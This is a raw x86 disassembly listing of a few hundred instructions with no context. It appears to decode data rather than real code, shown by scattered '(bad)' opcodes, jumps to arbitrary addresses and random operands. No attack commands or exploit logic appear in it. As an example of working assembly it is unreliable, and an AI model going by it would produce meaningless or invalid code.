  4bbc2f:	mov    DWORD PTR [esi+0x48],ecx
  4bbc32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4bbc33:	push   ss
  4bbc34:	xchg   BYTE PTR [esi],bh
  4bbc36:	and    al,0x15
  4bbc38:	nop
  4bbc39:	xor    BYTE PTR ds:0x8c1ad10a,dl
  4bbc3f:	(bad)  
  4bbc42:	push   0x163318df
  4bbc47:	push   0x34462986
  4bbc4c:	sub    ch,bl
  4bbc4e:	dec    esp
  4bbc4f:	sbb    edi,DWORD PTR ds:0xa3e04f70
  4bbc55:	xor    DWORD PTR [edi+edi*8+0x5],eax
  4bbc59:	retf   0x292a
  4bbc5c:	add    BYTE PTR [edi-0x43],ch
  4bbc5f:	addr16 or al,0xf4
  4bbc62:	inc    esp
  4bbc63:	jmp    0xabc1dd8
  4bbc68:	adc    eax,0xa4dea161
  4bbc6d:	inc    ebx
  4bbc6e:	sbb    cl,cl
  4bbc70:	icebp  
  4bbc71:	sbb    eax,DWORD PTR [eax]
  4bbc73:	mov    esi,0x63f04de
  4bbc78:	xchg   ecx,eax
  4bbc79:	add    BYTE PTR [esi],bl
  4bbc7b:	xchg   edi,eax
  4bbc7c:	ror    DWORD PTR [esi],0x51
  4bbc7f:	xor    DWORD PTR [ecx-0x54],0xffffffc3
  4bbc83:	por    mm6,QWORD PTR [edi+0x3522ecd6]
  4bbc8a:	nop
  4bbc8b:	add    al,BYTE PTR [edi+0x44]
  4bbc8e:	mov    ch,0x1e
  4bbc90:	or     eax,0x2b51cc2d
  4bbc95:	add    BYTE PTR [edi-0x29],dl
  4bbc98:	pop    ds
  4bbc99:	mov    DWORD PTR [edi+esi*4-0x4c],esi
  4bbc9d:	push   ebx
  4bbc9e:	(bad)  
  4bbc9f:	jb     0x4bbcc0
  4bbca1:	push   ebp
  4bbca2:	lds    ecx,FWORD PTR [ecx-0x480f6b6b]
  4bbca8:	enter  0x8ac7,0x25
  4bbcac:	fstp   QWORD PTR [ecx+0x22878d4f]
  4bbcb2:	pop    ds
  4bbcb3:	jb     0x4bbcf6
  4bbcb5:	adc    DWORD PTR [ebx+0x2d],ebx
  4bbcb8:	mov    al,ds:0x21523845
  4bbcbd:	jmp    0x4bbd17
  4bbcbf:	push   cs
  4bbcc0:	xor    ecx,DWORD PTR ds:0xa400549e
  4bbcc6:	nop
  4bbcc7:	and    al,0x71
  4bbcc9:	pop    eax
  4bbcca:	or     al,0x60
  4bbccc:	test   DWORD PTR [ecx+0x75],esi
  4bbccf:	dec    ecx
  4bbcd0:	and    BYTE PTR [ecx],ah
  4bbcd2:	add    eax,0x102e8e2
  4bbcd7:	sbb    BYTE PTR [eax],bh
  4bbcd9:	out    dx,eax
  4bbcda:	or     BYTE PTR [ecx+0x2560d60a],ch
  4bbce0:	pop    es
  4bbce1:	adc    al,0x7a
  4bbce3:	rcl    DWORD PTR [esi-0x2d67f14d],0xc3
  4bbcea:	mov    ebx,0xd9fc4b05
  4bbcef:	lea    ebx,[ebp-0x18]
  4bbcf2:	mov    ds:0x54a75bdf,eax
  4bbcf7:	push   ecx
  4bbcf8:	dec    eax
  4bbcf9:	retf   
  4bbcfa:	enter  0xa9d8,0xc2
  4bbcfe:	jae    0x4bbcfe
  4bbd00:	xchg   edi,eax
  4bbd01:	sbb    al,BYTE PTR [ecx]
  4bbd03:	push   esp
  4bbd04:	jbe    0x4bbd48
  4bbd06:	fsubr  DWORD PTR [edi+edx*8]
  4bbd09:	mov    cl,0xb5
  4bbd0b:	(bad)  
  4bbd0c:	xor    eax,DWORD PTR [eax+0xa87f5a5]
  4bbd12:	mov    al,ds:0x7f6d0cf0
  4bbd17:	or     DWORD PTR [bx-0x66],0x974bbafa
  4bbd1f:	inc    edx
  4bbd20:	jmp    0x5350edc5
  4bbd25:	pop    ebx
  4bbd26:	push   esi
  4bbd27:	xor    BYTE PTR [esi-0x3f],dl
  4bbd2a:	mov    ebx,DWORD PTR [ecx-0x36d4bf9c]
  4bbd30:	xor    al,0x5
  4bbd32:	adc    eax,0x84ce9d04
  4bbd37:	sub    edx,DWORD PTR [edx+0xae005da]
  4bbd3d:	mov    ah,0x90
  4bbd3f:	push   cs
  4bbd40:	leave  
  4bbd41:	mov    esp,0xed014bc
  4bbd46:	or     dl,dl
  4bbd48:	cli    
  4bbd49:	sar    dl,1
  4bbd4b:	adc    al,0x20
  4bbd4d:	xchg   esp,eax
  4bbd4e:	mov    BYTE PTR [ecx+ebx*8+0x20],cl
  4bbd52:	push   ebp
  4bbd53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4bbd54:	adc    BYTE PTR ds:0xc2d8b239,0x18
  4bbd5b:	xchg   esp,eax
  4bbd5c:	jo     0x4bbd75
  4bbd5e:	and    DWORD PTR [eax],edi
  4bbd60:	cli    
  4bbd61:	sar    BYTE PTR [edi-0x1d839ff1],0x8
  4bbd68:	jne    0x4bbddd
  4bbd6a:	mov    edi,0xe0d0c144
  4bbd6f:	mov    ah,0xb0
  4bbd71:	sbb    DWORD PTR [edi+0x27],ecx
  4bbd74:	push   0xffffff8b
  4bbd76:	(bad)  
  4bbd77:	retf   0x6df4
  4bbd7a:	fs stos DWORD PTR es:[edi],eax
  4bbd7c:	cmp    edi,DWORD PTR [eax+0x6b01024d]
  4bbd82:	ja     0x4bbd5d
  4bbd84:	or     BYTE PTR [ebp-0x5deb4d86],0x1d
  4bbd8b:	sub    eax,0xac00186
  4bbd90:	pop    ebp
  4bbd91:	stc    
  4bbd92:	push   eax
  4bbd93:	or     eax,0x8b3e36e6
  4bbd98:	out    dx,al
  4bbd99:	inc    edi
  4bbd9a:	retf   
  4bbd9b:	les    ebx,FWORD PTR [edx]
  4bbd9d:	dec    eax
  4bbd9e:	cmp    DWORD PTR [eax],ecx
  4bbda0:	pop    ds
  4bbda1:	adc    dl,BYTE PTR [edi]
  4bbda3:	dec    esp
  4bbda4:	xchg   edx,ebx
  4bbda6:	or     esp,esp
  4bbda8:	mov    ebp,0x6d1b2dc7
  4bbdad:	add    eax,0xc19c54b5
  4bbdb2:	out    0x59,eax
  4bbdb4:	cmp    BYTE PTR [edi-0x38],dl
  4bbdb7:	sub    esp,DWORD PTR [esp+edi*8+0x56]
  4bbdbb:	sub    BYTE PTR [esi-0x60],bh
  4bbdbe:	mov    fs,WORD PTR [edx]
  4bbdc0:	mov    ch,0x62
  4bbdc2:	lods   eax,DWORD PTR ds:[esi]
  4bbdc3:	mov    ecx,DWORD PTR [ecx-0x721fb3d7]
  4bbdc9:	inc    esp
  4bbdca:	xor    ah,BYTE PTR [edi]
  4bbdcc:	js     0x4bbd7a
  4bbdce:	pop    ebp
  4bbdcf:	js     0x4bbdf4
  4bbdd1:	dec    ebx
  4bbdd2:	mov    DWORD PTR [ebx],edi
  4bbdd4:	jbe    0x4bbdf3
  4bbdd6:	test   eax,0x21bc8ac1
  4bbddb:	mov    WORD PTR [ecx+esi*1],?
  4bbdde:	add    DWORD PTR [eax-0x571a1f26],esi
  4bbde4:	xchg   ecx,eax
  4bbde5:	loopne 0x4bbda9
  4bbde7:	aam    0xb1
  4bbde9:	lods   al,BYTE PTR ds:[esi]
  4bbdea:	jns    0x4bbd80
  4bbdec:	mov    ch,bl
  4bbdee:	cmp    dl,BYTE PTR [esi+0x78e8a4fa]
  4bbdf4:	nop
  4bbdf5:	rol    ebp,0x8d
  4bbdf8:	adc    BYTE PTR [ecx-0x73],ch
  4bbdfb:	xchg   DWORD PTR [ebx],edx
  4bbdfd:	dec    edi
  4bbdfe:	shr    dh,cl
  4bbe00:	adc    BYTE PTR [eax-0x50],ch
  4bbe03:	arpl   WORD PTR [ebp+0x56179980],dx
  4bbe09:	(bad)  
  4bbe0a:	mov    eax,0x4c00c58
  4bbe0f:	push   cs
  4bbe10:	pop    ds
  4bbe11:	or     ah,BYTE PTR [esi+ecx*8+0x5407b831]
  4bbe18:	repz fisttp DWORD PTR [ebp+0x4d29a543]
  4bbe1f:	stc    
  4bbe20:	push   cs
  4bbe21:	push   0x9600edb8
  4bbe26:	adc    BYTE PTR [ebp-0x767d9b7f],dl
  4bbe2c:	add    al,al
  4bbe2e:	test   DWORD PTR [ecx],ecx
  4bbe30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4bbe31:	jl     0x4bbdcf
  4bbe33:	sub    dh,bh
  4bbe35:	inc    eax
  4bbe36:	mov    DWORD PTR [ecx+0x28920706],edx
  4bbe3c:	sub    al,0x61
  4bbe3e:	popf   
  4bbe3f:	jo     0x4bbe5a
  4bbe41:	dec    eax
  4bbe42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4bbe43:	nop
  4bbe44:	cmp    BYTE PTR [eax-0x38],dh
  4bbe47:	in     al,0x8
  4bbe49:	cmp    DWORD PTR [edx+0x60],esi
  4bbe4c:	clc    
  4bbe4d:	cld    
  4bbe4e:	pusha  
  4bbe4f:	and    DWORD PTR [ebx],esp
  4bbe51:	xchg   edi,eax
  4bbe52:	adc    eax,0x61a41848
  4bbe58:	test   DWORD PTR [eax+ecx*2-0x68],ecx
  4bbe5c:	and    bl,ah
  4bbe5e:	inc    ebp
  4bbe5f:	or     BYTE PTR [edi],0xb
  4bbe62:	adc    eax,0x50a7c350
  4bbe67:	sub    eax,0x58fdd074
  4bbe6c:	adc    dh,BYTE PTR [ebp-0x32f2798]
  4bbe72:	sahf   
  4bbe73:	(bad)  [eax+0x36c580d9]
  4bbe79:	mov    edi,0xd03e078f
  4bbe7e:	dec    ecx
  4bbe7f:	sti    
  4bbe80:	es and al,0x6c
  4bbe83:	cli    
  4bbe84:	test   BYTE PTR [ebx+edi*1+0x3a],bh
  4bbe88:	stos   DWORD PTR es:[edi],eax
  4bbe89:	mov    ebp,0x2d2b3389
  4bbe8e:	and    DWORD PTR [edi+0x55295ca],edx
  4bbe94:	fwait
  4bbe95:	inc    edi
  4bbe96:	enter  0x7211,0x23
  4bbe9a:	sbb    DWORD PTR [esi],ebp
  4bbe9c:	jb     0x4bbe22
  4bbe9e:	sbb    al,0x21
  4bbea0:	pop    ds
  4bbea1:	pop    ss
  4bbea2:	and    DWORD PTR [edi-0x38],eax
  4bbea5:	adc    DWORD PTR [esi],edx
  4bbea7:	sbb    BYTE PTR [ecx],dl
  4bbea9:	jb     0x4bbe2f
  4bbeab:	sbb    al,0x1a
  4bbead:	adc    BYTE PTR [ecx+eiz*1],bl
  4bbeb0:	inc    edi
  4bbeb1:	enter  0x206,0xb
  4bbeb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4bbeb6:	adc    dh,BYTE PTR [edx-0x7c]
  4bbeb9:	pop    es
  4bbeba:	and    BYTE PTR [esi+0x6f360420],dl
  4bbec0:	xchg   edx,eax
  4bbec1:	out    dx,eax
  4bbec2:	or     eax,ebx
  4bbec4:	(bad)  
  4bbec5:	xor    eax,0x813922d0
  4bbeca:	ja     0x4bbeee
  4bbecc:	shr    BYTE PTR [ecx],cl
  4bbece:	add    BYTE PTR [esp+edx*8+0x5adfa19],ch
  4bbed5:	push   edx
  4bbed6:	cmp    eax,0xbc230d8b
  4bbedb:	mov    ebp,0x2c79a71b
  4bbee0:	add    BYTE PTR [ecx-0x73],dl
  4bbee3:	je     0x4bbf06
  4bbee5:	sbb    dh,BYTE PTR [eax+0x21]
  4bbee8:	and    eax,0x923f498
  4bbeed:	cmp    eax,0x481038d9
  4bbef2:	hlt    
  4bbef3:	aaa    
  4bbef4:	or     DWORD PTR [ecx-0x3b8e12e0],0xffffffcc
  4bbefb:	sub    eax,0x84e01d8
  4bbf00:	pop    eax
  4bbf01:	xor    eax,0x8e48e423
  4bbf06:	in     al,0x3
  4bbf08:	or     DWORD PTR ds:0x8e48e48e,eax
  4bbf0e:	or     al,BYTE PTR [edx]
  4bbf10:	pop    es
  4bbf11:	inc    ecx
  4bbf12:	mov    fs,esp
  4bbf14:	dec    eax
  4bbf15:	or     BYTE PTR [eax+eax*1],al
  4bbf18:	pop    ecx
  4bbf19:	add    dl,BYTE PTR [ecx]
  4bbf1b:	mov    ebp,0xdb924430
  4bbf20:	mov    ecx,0x13ddce6
  4bbf25:	xchg   ecx,eax
  4bbf26:	sbb    al,0xdb
  4bbf28:	inc    ecx
  4bbf29:	sbb    ebp,ebx
  4bbf2b:	fist   WORD PTR [edi+0x39239040]
  4bbf31:	fiadd  DWORD PTR [ecx+0x23]
  4bbf34:	inc    edx
  4bbf35:	inc    ebx
  4bbf36:	xor    cl,BYTE PTR [ecx+0x73]
  4bbf39:	test   BYTE PTR [esi-0x3cedea38],0xb8
  4bbf40:	fdiv   DWORD PTR [esi+ebp*2]
  4bbf43:	dec    edx
  4bbf44:	dec    eax
  4bbf45:	fucomp st(5)
  4bbf47:	pop    eax
  4bbf48:	add    eax,0xaff8b69a
  4bbf4d:	cmp    DWORD PTR [ebx],esi
  4bbf4f:	inc    ebp
  4bbf50:	stos   BYTE PTR es:[edi],al
  4bbf51:	push   0x1f155367
  4bbf56:	es push esp
  4bbf58:	add    DWORD PTR [eax-0x7fddc7be],0x90022ac0
  4bbf62:	je     0x4bbf77
  4bbf64:	jns    0x4bbf38
  4bbf66:	inc    esi
  4bbf67:	dec    edi
  4bbf68:	add    eax,0x3907ffee
  4bbf6d:	neg    BYTE PTR [ebx-0x46]
  4bbf70:	mov    cl,0xb8
  4bbf72:	call   0xc97f9f8a
  4bbf77:	xor    cl,dl
  4bbf79:	cli    
  4bbf7a:	or     al,bh
  4bbf7c:	or     BYTE PTR [edi],0xa2
  4bbf7f:	push   es
  4bbf80:	loope  0x4bbfa7
  4bbf82:	xor    al,0x83
  4bbf84:	xchg   edx,eax
  4bbf85:	pop    esi
  4bbf86:	pop    edx
  4bbf87:	imul   eax,DWORD PTR [ebx],0xf02e2e11
  4bbf8d:	jbe    0x4bbfaf
  4bbf8f:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4bbf91:	ret    0x757b
  4bbf94:	add    eax,0xfc77c25d
  4bbf99:	aam    0xd4
  4bbf9b:	test   BYTE PTR [ecx],dl
  4bbf9d:	jns    0x4bbfc9
  4bbf9f:	sub    ch,BYTE PTR [ebp-0x45]
  4bbfa2:	ret    0xb8b8
  4bbfa5:	adc    dl,al
  4bbfa7:	sub    DWORD PTR [esi],ebx
  4bbfa9:	sub    BYTE PTR [edx+ecx*8],bl
  4bbfac:	and    al,0x95
  4bbfae:	dec    ecx
  4bbfaf:	es xor al,0x24
  4bbfb2:	xor    cl,BYTE PTR [ecx+0x65]
  4bbfb5:	xchg   edx,eax
  4bbfb6:	inc    eax
  4bbfb7:	and    dl,BYTE PTR [eax+eiz*1+0x25]
  4bbfbb:	mov    ds:0x1e68a499,eax
  4bbfc0:	sbb    ebp,esp
  4bbfc2:	mov    al,ds:0xb88ebf75
  4bbfc7:	jl     0x4bbfef
  4bbfc9:	nop
  4bbfca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4bbfcb:	xor    ch,BYTE PTR [ebp+0x5]
  4bbfce:	inc    esp
  4bbfcf:	mov    eax,0x9c1c5d8c
  4bbfd4:	inc    esi
  4bbfd5:	add    al,0x64
  4bbfd7:	sar    DWORD PTR [edx],0xf8
  4bbfda:	lods   al,BYTE PTR ds:[esi]
  4bbfdb:	mov    edx,0x989b82c
  4bbfe0:	xor    DWORD PTR ds:0x580d2d,edi
  4bbfe6:	add    eax,0xffffffb5
  4bbfe9:	out    dx,eax
  4bbfea:	jmp    0xa2aa:0xb8587089
  4bbff1:	push   0x1e1dc058
  4bbff6:	ror    BYTE PTR [ebp-0x2f451a4b],1
  4bbffc:	ret    0x673c
  4bbfff:	pop    ebp
  4bc000:	sub    bh,BYTE PTR ds:0x2c47bab9
  4bc006:	ret    
  4bc007:	add    DWORD PTR [esi+0x48939314],ebx
  4bc00d:	ret    
  4bc00e:	adc    ch,BYTE PTR [ecx+0x323486b1]
  4bc014:	cld    
  4bc015:	bound  ebp,QWORD PTR [edi-0x46cf00ce]
  4bc01b:	add    ebx,DWORD PTR [esi]
  4bc01d:	test   BYTE PTR [ebx+0x2dcfce4],dl
  4bc023:	push   ebp
  4bc024:	cmp    ah,BYTE PTR [esi]
  4bc026:	and    al,0x14
  4bc028:	sbb    edx,ebp
  4bc02a:	ds ret 0x670e
  4bc02e:	adc    al,0x1e
  4bc030:	push   0x11038e7c
  4bc035:	(bad)  [esi]
  4bc037:	and    eax,0x51305121
  4bc03c:	nop
  4bc03d:	push   edx
  4bc03e:	push   ecx
  4bc03f:	ja     0x4bc0af
  4bc041:	fild   DWORD PTR ds:0x2b46b0e9
  4bc047:	into   
  4bc048:	test   BYTE PTR [ebp+0x41],bh
  4bc04b:	aam    0xb7
  4bc04d:	and    ecx,DWORD PTR [ebx-0x30]
  4bc050:	sbb    eax,0xf752c08
  4bc055:	mov    edx,0x1eeda52e
  4bc05a:	enter  0x7525,0x2d
  4bc05e:	jmp    0x4bc068
  4bc060:	adc    al,BYTE PTR [eax+edx*2+0x46d9db5b]
  4bc067:	mov    bl,0x50
  4bc069:	inc    edi
  4bc06a:	mov    esp,edx
  4bc06c:	fnstenv [ebx-0x56659e80]
  4bc072:	cmp    eax,0x540af63b
  4bc077:	pop    es
  4bc078:	add    eax,0x232093d5
  4bc07d:	dec    ebp
  4bc07e:	sbb    al,0x5
  4bc080:	dec    esp
  4bc081:	mov    esi,0xfa11dc13
  4bc086:	cld    
  4bc087:	add    esp,DWORD PTR [esp+ebx*1]
  4bc08a:	sbb    ah,BYTE PTR [ebx+0x4d]
  4bc08d:	(bad)  
  4bc08e:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4bc090:	and    BYTE PTR [eax-0x5faad428],0x53
  4bc097:	ror    BYTE PTR [ebp+0x36a52e4],cl
  4bc09d:	add    DWORD PTR [eax+edx*8],0xffffffe2
  4bc0a1:	inc    esp
  4bc0a2:	push   0xd87dcd03
  4bc0a7:	pop    ss
  4bc0a8:	pop    ebx
  4bc0a9:	dec    eax
  4bc0aa:	mov    DWORD PTR [edi-0xe],esp
  4bc0ad:	inc    ebx
  4bc0ae:	fcom   QWORD PTR [ebx+0x3b212ca0]
  4bc0b4:	adc    BYTE PTR [ecx-0x1a],cl
  4bc0b7:	push   es
  4bc0b8:	or     eax,0x95b00c7f
  4bc0bd:	inc    edx
  4bc0be:	pop    ecx
  4bc0bf:	gs mov ah,0xb
  4bc0c2:	gs jge 0x4bc0f3
  4bc0c5:	push   ecx
  4bc0c6:	push   edi
  4bc0c7:	jmp    0x4bc0cc
  4bc0c9:	pop    eax
  4bc0ca:	lock fs push 0x9d03e3ab
  4bc0d1:	je     0x4bc086
  4bc0d3:	mov    DWORD PTR ss:[ebx],eax
  4bc0d6:	inc    ebp
  4bc0d7:	retf   
  4bc0d8:	popf   
  4bc0d9:	xchg   ebp,eax
  4bc0da:	popa   
  4bc0db:	test   BYTE PTR [ebx+edx*1],bl
  4bc0de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4bc0df:	nop
  4bc0e0:	adc    eax,0x1c735c70
  4bc0e5:	dec    edx
  4bc0e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4bc0e7:	test   al,0x22
  4bc0e9:	and    edx,DWORD PTR ds:0xd4e93496
  4bc0ef:	mov    bl,0xa6
  4bc0f1:	xchg   ebp,eax
  4bc0f2:	xchg   edi,eax
  4bc0f3:	test   DWORD PTR [ebx-0x38],0xbe36c0a1
  4bc0fa:	jns    0x4bc07f
  4bc0fc:	sbb    BYTE PTR [eax],ah
  4bc0fe:	sbb    BYTE PTR [esi],bl
  4bc100:	add    BYTE PTR [ecx-0xfdf369f],al
  4bc106:	dec    esp
  4bc107:	mov    dl,0x9
  4bc109:	or     esi,DWORD PTR [edx+0x5c]
  4bc10c:	xlat   BYTE PTR ds:[ebx]
  4bc10d:	xor    DWORD PTR [ecx],0x3a
  4bc110:	jecxz  0x4bc113
  4bc112:	jmp    FWORD PTR [ebx-0x2ed210fd]
  4bc118:	xchg   esp,eax
  4bc119:	ret    
  4bc11a:	inc    DWORD PTR ds:0xed582ec0
  4bc120:	push   0x6f37b9c4
  4bc125:	mov    al,0x37
  4bc127:	nop
  4bc128:	sub    esp,esp
  4bc12a:	sub    eax,0x84b99ca7
  4bc12f:	mov    DWORD PTR [ebp+0x21],ecx
  4bc132:	scas   eax,DWORD PTR es:[edi]
  4bc133:	lods   al,BYTE PTR ds:[esi]
  4bc134:	ret    
  4bc135:	les    esi,FWORD PTR [edi]
  4bc137:	or     eax,edx
  4bc139:	sub    dh,ch
  4bc13b:	mov    edi,DWORD PTR [esi+0x38eb3848]
  4bc141:	in     eax,dx
  4bc142:	jecxz  0x4bc15a
  4bc144:	xor    BYTE PTR [esi+0x4c83204c],al
  4bc14a:	fsub   DWORD PTR [ebp+ebp*1+0x6e]
  4bc14e:	or     BYTE PTR [ecx+0x4c],0x60
  4bc152:	adc    DWORD PTR [eax+0x10c72a0f],ebp
  4bc158:	sub    al,BYTE PTR [edx-0xb]
  4bc15b:	cmp    eax,0x25540061
  4bc160:	lods   al,BYTE PTR ds:[esi]
  4bc161:	cmp    BYTE PTR [ebx-0x1860cbeb],bl
  4bc167:	std    
  4bc168:	push   ebp
  4bc169:	and    al,BYTE PTR [edi+0x0]
  4bc16c:	je     0x4bc174
  4bc16e:	sahf   
  4bc16f:	fbld   TBYTE PTR [ebx+eiz*1]
  4bc172:	imul   edi,DWORD PTR [ecx-0x66],0xf3aef3cf
  4bc179:	cmp    BYTE PTR [edi*2-0x60cb0c5f],ah
  4bc180:	out    0xdd,eax
  4bc182:	not    DWORD PTR [ecx]
  4bc184:	and    eax,0xf3cf452b
  4bc189:	cmp    al,0xcf
  4bc18b:	pop    edi
  4bc18c:	jns    0x4bc121
  4bc18e:	lods   eax,DWORD PTR ds:[esi]
  4bc18f:	(bad)  
  4bc190:	loope  0x4bc14e
  4bc192:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4bc193:	stc    
  4bc194:	cmp    al,0xfb
  4bc196:	adc    eax,0xe492f26
  4bc19b:	arpl   WORD PTR [ecx+0x3e],bp
  4bc19e:	iret   
  4bc19f:	repz jge 0x4bc13c
  4bc1a2:	mov    ecx,0xe7fd2da0
  4bc1a7:	jns    0x4bc147
  4bc1a9:	test   BYTE PTR [edi],0x27
  4bc1ac:	push   es
  4bc1ad:	and    DWORD PTR [ebx],esi
  4bc1af:	inc    ebp
  4bc1b0:	(bad)  
  4bc1b1:	sahf   
  4bc1b2:	out    0x79,eax
  4bc1b4:	sahf   
  4bc1b5:	(bad)  [edi]
  4bc1b7:	push   edi
  4bc1b8:	imul   edi,DWORD PTR [ebx-0x73],0xf9a79e79
  4bc1bf:	dec    esi
  4bc1c0:	outs   dx,DWORD PTR ds:[esi]
  4bc1c1:	sub    al,0xeb
  4bc1c3:	std    
  4bc1c4:	lahf   
  4bc1c5:	mov    esi,0x569e79e7
  4bc1ca:	sub    BYTE PTR [esi],al
  4bc1cc:	sbb    ah,BYTE PTR ds:0xde7c4c30
  4bc1d2:	jge    0x4bc172
  4bc1d4:	iret   
  4bc1d5:	fnstenv [edi+0x29]
  4bc1d8:	outs   dx,BYTE PTR ds:[esi]
  4bc1d9:	push   es
  4bc1da:	mov    al,0x63
  4bc1dc:	sub    BYTE PTR [esi-0x62730659],bl
  4bc1e2:	adc    ebp,DWORD PTR [edx]
  4bc1e4:	sub    ebp,DWORD PTR [esi-0x18326539]
  4bc1ea:	jns    0x4bc1c9
  4bc1ec:	repz or DWORD PTR [ebx],ebp
  4bc1ef:	loope  0x4bc212
  4bc1f1:	(bad)  
  4bc1f2:	repz mov esp,0x221b7da7
  4bc1f8:	push   ds
  4bc1f9:	pop    ds
  4bc1fa:	inc    ecx
  4bc1fb:	push   es
  4bc1fc:	arpl   WORD PTR [edx-0x19610844],si
  4bc202:	pop    esp
  4bc203:	sub    al,0x1
  4bc205:	cmp    BYTE PTR [esi],dh
  4bc207:	aas    
  4bc208:	push   cs
  4bc209:	sbb    eax,0x3cf98106
  4bc20e:	iret   
  4bc20f:	repz popf 
  4bc211:	mov    ecx,0x2d0df1d5
  4bc216:	jl     0x4bc1b6
  4bc218:	xchg   ebx,eax
  4bc219:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4bc21a:	sub    DWORD PTR [ebp+eax*2+0x92d6156],esi
  4bc221:	or     al,0x6e
  4bc223:	adc    eax,DWORD PTR [edi+0x2ed40fa0]
  4bc229:	inc    ecx
  4bc22a:	sub    al,0x4d
  4bc22c:	mov    cl,0xe7
  4bc22e:	loopne 0x4bc2a7
  4bc230:	sbb    BYTE PTR [edx],al
  4bc232:	mov    DWORD PTR [ebp+0x58c04897],esp
  4bc238:	add    BYTE PTR [esi],cl
  4bc23a:	dec    esp
  4bc23b:	pop    ds
  4bc23c:	add    DWORD PTR [ebp+0x32db0081],esi
  4bc242:	fist   DWORD PTR [esi]
  4bc244:	xor    dh,ch
  4bc246:	and    al,0x2c
  4bc248:	jno    0x4bc1fa
  4bc24a:	je     0x4bc2b7
  4bc24c:	shr    BYTE PTR [edx+0x16],cl
  4bc24f:	leave  
  4bc250:	adc    bh,BYTE PTR [edx+eiz*4+0x1b0d6813]
  4bc257:	lea    eax,[edi-0xe]
  4bc25a:	out    0xf2,al
  4bc25c:	sub    ah,dl
  4bc25e:	and    al,0xf
  4bc260:	test   ecx,edx
  4bc262:	jle    0x4bc288
  4bc264:	lea    eax,[ebp-0x20]
  4bc267:	mov    esp,0x473f9193
  4bc26c:	jmp    0x626cc984
  4bc271:	sar    BYTE PTR [esi+0x62],1
  4bc274:	je     0x4bc2cb
  4bc276:	es lock gs push edi
  4bc27a:	loope  0x4bc230
  4bc27c:	xchg   ebp,eax
  4bc27d:	jg     0x4bc2f1
  4bc27f:	sar    BYTE PTR [esi+0x2],1
  4bc282:	inc    edi
  4bc283:	cmp    eax,0x24
  4bc286:	jle    0x4bc288
  4bc288:	retf   0x28ad
  4bc28b:	pushf  
  4bc28c:	lock loopne 0x4bc2d9
  4bc28f:	inc    edi
  4bc290:	push   ecx
  4bc291:	mov    eax,0x13290320
  4bc296:	and    eax,0xe911de91
  4bc29b:	adc    DWORD PTR [ecx-0x670fd410],ebx
  4bc2a1:	sbb    eax,0xa0918e20
  4bc2a6:	jnp    0x4bc288
  4bc2a8:	inc    eax
  4bc2a9:	shr    BYTE PTR [ebp-0x7c390ec],1
  4bc2af:	and    BYTE PTR [ecx],al
  4bc2b1:	ja     0x4bc253
  4bc2b3:	cld    
  4bc2b4:	adc    eax,0x3fb2d8bf
  4bc2b9:	outs   dx,DWORD PTR ss:[esi]
  4bc2bb:	mov    al,0x91
  4bc2bd:	fisubr WORD PTR [edx+0x4f]
  4bc2c0:	(bad)  
  4bc2c1:	pop    edi
  4bc2c2:	pop    ebx
  4bc2c3:	and    eax,0xb4073493
  4bc2c8:	inc    eax
  4bc2c9:	fild   WORD PTR [eax+0x4]
  4bc2cc:	dec    edx
  4bc2cd:	sbb    bl,BYTE PTR [edx+0x5a]
  4bc2d0:	test   eax,0x4721e79a
  4bc2d5:	inc    eax
  4bc2d6:	repz add BYTE PTR [ebp+0x52],dl
  4bc2da:	cmp    eax,0xdd485289
  4bc2df:	loope  0x4bc304
  4bc2e1:	or     BYTE PTR [edi+0x7c],al
  4bc2e4:	or     ecx,DWORD PTR [ebp-0x38]
  4bc2e7:	stos   BYTE PTR es:[edi],al
  4bc2e8:	and    DWORD PTR [esp+eax*1+0x9],ebp
  4bc2ec:	dec    ebp
  4bc2ed:	int3   
  4bc2ee:	cmp    eax,0x7085a065
  4bc2f3:	push   ebp
  4bc2f4:	mov    al,0xd3
  4bc2f6:	adc    BYTE PTR [ecx],ch
  4bc2f8:	xor    eax,0x192ef022
  4bc2fd:	mov    dl,0x3f
  4bc2ff:	pop    esp
  4bc300:	jmp    0xdddec888
  4bc305:	jmp    0x4bc33b
  4bc307:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4bc308:	add    DWORD PTR [edx+esi*8],0xd055d714
  4bc30f:	push   edx
  4bc310:	mov    ecx,0xe334349c
  4bc315:	loopne 0x4bc395
  4bc317:	inc    BYTE PTR [eax+0x57]
  4bc31a:	das    
  4bc31b:	aas    
  4bc31c:	or     al,0x8d
  4bc31e:	jge    0x4bc300
  4bc320:	jne    0x4bc2d2
  4bc322:	(bad)
  4bc325:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4bc326:	mov    cs,WORD PTR [edi+0x46e087d0]
  4bc32c:	pop    edx
  4bc32d:	popa   
  4bc32e:	sbb    cl,cl
  4bc330:	mov    bl,0x1a
  4bc332:	inc    edx
  4bc333:	jo     0x4bc2cb
  4bc335:	in     eax,dx
  4bc336:	jmp    0x4bc2e9
  4bc338:	daa    
  4bc339:	sti    
  4bc33a:	pop    eax
  4bc33b:	mov    bl,0x61
  4bc33d:	cmp    al,0xeb
  4bc33f:	xchg   esi,eax
  4bc340:	cmp    DWORD PTR [ecx-0x3d],ecx
  4bc343:	add    BYTE PTR [ecx],bl
  4bc345:	lods   eax,DWORD PTR ds:[esi]
  4bc346:	fadd   st,st(4)
  4bc348:	or     eax,DWORD PTR [ecx+0x281de1ed]
  4bc34e:	pop    esi
  4bc34f:	mov    BYTE PTR [eax+0x10],cl
  4bc352:	xchg   ebp,eax
  4bc353:	and    eax,0xf95bd084
  4bc358:	ss and eax,0xb6a6148d
  4bc35e:	pop    esi
  4bc35f:	adc    BYTE PTR [edx],bl
  4bc361:	mov    DWORD PTR [ebx+0x0],esi
  4bc364:	leave  
  4bc365:	adc    BYTE PTR [eax+0x57],0x53
